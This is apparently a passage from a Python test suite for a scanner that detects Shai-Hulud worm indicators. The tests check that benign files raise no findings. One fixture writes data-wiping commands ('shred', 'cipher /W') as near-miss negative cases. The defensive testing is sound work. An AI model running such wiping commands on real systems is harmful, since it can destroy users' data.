        sh = tmp_path / "ok.sh"
        sh.write_text("shred --help\ncipher /W:C:\\build\\tmp\n")
        findings = scanner.scan_shai_hulud_family_indicators(str(sh), "ok.sh")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    # --- Hygiene ---

    def test_benign_package_json_no_findings(self, tmp_path):
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "t",
            "scripts": {"build": "tsc", "postinstall": "husky install"},
            "dependencies": {"express": "4.18.0"},
        }))
        findings = scanner.scan_shai_hulud_family_indicators(str(pkg), "package.json")
        assert findings == [], f"Unexpected findings: {[f.title for f in findings]}"

    def test_long_line_is_skipped(self, tmp_path):
        """MAX_LINE_LENGTH guard: minified blobs are not regex-scanned."""
        js = tmp_path / "min.js"
        js.write_text("x" * (scanner.core.MAX_LINE_LENGTH + 10) + "router_init.js\n")
        findings = scanner.scan_shai_hulud_family_indicators(str(js), "min.js")
        assert findings == []

    def test_unreadable_file_does_not_raise(self, tmp_path):
        findings = scanner.scan_shai_hulud_family_indicators(
            str(tmp_path / "nope.js"), "nope.js"
        )
        assert findings == []
